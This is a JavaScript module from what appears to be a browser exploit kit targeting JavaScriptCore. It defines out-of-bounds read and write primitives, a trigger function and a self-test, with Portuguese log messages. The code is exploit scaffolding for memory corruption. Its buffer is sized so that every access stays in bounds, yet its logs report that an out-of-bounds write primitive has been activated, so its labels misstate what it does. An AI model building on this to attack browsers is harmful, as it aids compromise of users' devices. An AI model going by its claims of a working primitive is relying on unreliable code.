// js/core_exploit.mjs
import { AdvancedInt64 } from './int64.mjs';
import { log, toHexS1 } from './utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;

export function getOOBAllocationSize() { return OOB_CONFIG.ALLOCATION_SIZE; }
export function getBaseOffsetInDV() { return OOB_CONFIG.BASE_OFFSET_IN_DV; }
export function getInitialBufferSize() { return OOB_CONFIG.INITIAL_BUFFER_SIZE; }
export function getJSCOffsets() { return JSC_OFFSETS; }


export async function triggerOOB_primitive() {
    const FNAME = 'CoreExploit.triggerOOB_primitive';
    updateOOBConfigFromUI(); // Garante que as configs da UI sejam lidas
    log(`--- Iniciando ${FNAME} ---`, 'test', FNAME);
    const writeValueToTriggerOOB = 0xEE;
    const oobWriteOffsetFromLogicalStart = OOB_CONFIG.INITIAL_BUFFER_SIZE;

    oob_array_buffer_real = null; oob_dataview_real = null;
    try {
        const totalSizeNeeded = OOB_CONFIG.BASE_OFFSET_IN_DV + oobWriteOffsetFromLogicalStart + OOB_CONFIG.ALLOCATION_SIZE + 64;
        oob_array_buffer_real = new ArrayBuffer(totalSizeNeeded);
        oob_dataview_real = new DataView(oob_array_buffer_real);
        log(`   oob_array_buffer_real alocado com ${oob_dataview_real.buffer.byteLength} bytes.`, "info", FNAME);
        for (let i = 0; i < oob_dataview_real.buffer.byteLength; i++) { oob_dataview_real.setUint8(i, 0xAA); }

        const initialOOBWriteAbsoluteAddr = OOB_CONFIG.BASE_OFFSET_IN_DV + oobWriteOffsetFromLogicalStart;
        log(`   Escrita OOB inicial (0x${writeValueToTriggerOOB.toString(16)}) em abs_offset DV: ${initialOOBWriteAbsoluteAddr}`, 'info', FNAME);
        oob_dataview_real.setUint8(initialOOBWriteAbsoluteAddr, writeValueToTriggerOOB);
        log(`   Primitiva de escrita OOB relativa inicial ativada.`, 'vuln', FNAME);
    } catch(e) {
        log(`ERRO CRÍTICO em ${FNAME}: ${e.message} ${e.stack ? "\nStack: "+e.stack : ''}`, "error", FNAME); console.error(`ERRO CRÍTICO em ${FNAME}:`, e);
    } finally {
        log(`--- ${FNAME} Concluído ---`, 'test', FNAME);
        if (oob_dataview_real && oob_array_buffer_real) {
            log("`oob_dataview_real` e `oob_array_buffer_real` estão configurados.", "good", FNAME);
        } else { log("`oob_dataview_real` OU `oob_array_buffer_real` NÃO foram definidos!", "error", FNAME); }
    }
}

export function oob_read_relative(relative_offset, num_bytes = 4) {
    const FNAME_READ = "CoreExploit.oob_read_relative";
    if (!oob_dataview_real) { log(`ERRO (${FNAME_READ}): oob_dataview_real não pronto!`, "error"); return null; }
    const absolute_offset_in_dv = OOB_CONFIG.BASE_OFFSET_IN_DV + relative_offset;
    if (absolute_offset_in_dv < 0 || absolute_offset_in_dv + num_bytes > oob_dataview_real.buffer.byteLength) { return null; }
    try {
        let value;
        switch (num_bytes) {
            case 1: value = oob_dataview_real.getUint8(absolute_offset_in_dv); break;
            case 2: value = oob_dataview_real.getUint16(absolute_offset_in_dv, true); break;
            case 4: value = oob_dataview_real.getUint32(absolute_offset_in_dv, true); break;
            case 8: value = new AdvancedInt64(oob_dataview_real.getUint32(absolute_offset_in_dv, true), oob_dataview_real.getUint32(absolute_offset_in_dv + 4, true)); break;
            default: log(`ERRO (${FNAME_READ}): Bytes inválidos: ${num_bytes}`, "error"); return null;
        }
        return value;
    } catch (e) { return null; }
}

export function oob_write_relative(relative_offset, value, num_bytes = 4) {
    const FNAME_WRITE = "CoreExploit.oob_write_relative";
    if (!oob_dataview_real) { log(`ERRO (${FNAME_WRITE}): oob_dataview_real não pronto!`, "error"); return; }
    const absolute_offset_in_dv = OOB_CONFIG.BASE_OFFSET_IN_DV + relative_offset;
    if (absolute_offset_in_dv < 0 || absolute_offset_in_dv + num_bytes > oob_dataview_real.buffer.byteLength) { log(`ERRO Escrita Relativa OOB: abs_offset ${absolute_offset_in_dv} fora dos limites`, "error", FNAME_WRITE); return; }
    try {
        switch (num_bytes) {
            case 1: oob_dataview_real.setUint8(absolute_offset_in_dv, Number(value)); break;
            case 2: oob_dataview_real.setUint16(absolute_offset_in_dv, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(absolute_offset_in_dv, Number(value), true); break;
            case 8:
                let val64 = value instanceof AdvancedInt64 ? value : new AdvancedInt64(value);
                oob_dataview_real.setUint32(absolute_offset_in_dv, val64.low(), true);
                oob_dataview_real.setUint32(absolute_offset_in_dv + 4, val64.high(), true);
                break;
            default: log(`ERRO (${FNAME_WRITE}): Bytes inválidos: ${num_bytes}`, "error"); return;
        }
    } catch (e) { log(`ERRO em ${FNAME_WRITE} (abs ${absolute_offset_in_dv}): ${e.message}`, "error"); }
}

export async function testModule() {
    log("--- Testando Módulo CoreExploit (core_exploit.mjs) ---", "test", "CoreExploit.test");
    await triggerOOB_primitive();
    if (!oob_dataview_real) {
        log("Falha ao ativar primitiva OOB. Teste abortado.", "error", "CoreExploit.test");
        return;
    }
    const test_rel_offset = OOB_CONFIG.INITIAL_BUFFER_SIZE + 16;
    const test_val32 = 0x12345678;
    const test_val64 = new AdvancedInt64("0xAABBCCDDEEFF0011");

    log(`Escrevendo ${toHexS1(test_val32)} em offset relativo ${test_rel_offset}`, "info", "CoreExploit.test");
    oob_write_relative(test_rel_offset, test_val32, 4);
    const read_val32 = oob_read_relative(test_rel_offset, 4);
    if (read_val32 === test_val32) {
        log(`SUCESSO: Lido ${toHexS1(read_val32)} corretamente (32bit).`, "good", "CoreExploit.test");
    } else {
        log(`FALHA: Lido ${toHexS1(read_val32)}, esperado ${toHexS1(test_val32)}.`, "error", "CoreExploit.test");
    }

    log(`Escrevendo ${test_val64.toString(true)} em offset relativo ${test_rel_offset + 4}`, "info", "CoreExploit.test");
    oob_write_relative(test_rel_offset + 4, test_val64, 8);
    const read_val64 = oob_read_relative(test_rel_offset + 4, 8);
    if (read_val64 instanceof AdvancedInt64 && read_val64.equals(test_val64)) {
        log(`SUCESSO: Lido ${read_val64.toString(true)} corretamente (64bit).`, "good", "CoreExploit.test");
    } else {
        log(`FALHA: Lido ${read_val64 ? read_val64.toString(true) : "null/erro"}, esperado ${test_val64.toString(true)}.`, "error", "CoreExploit.test");
    }
    log("Teste CoreExploit concluído.", "good", "CoreExploit.test");
}
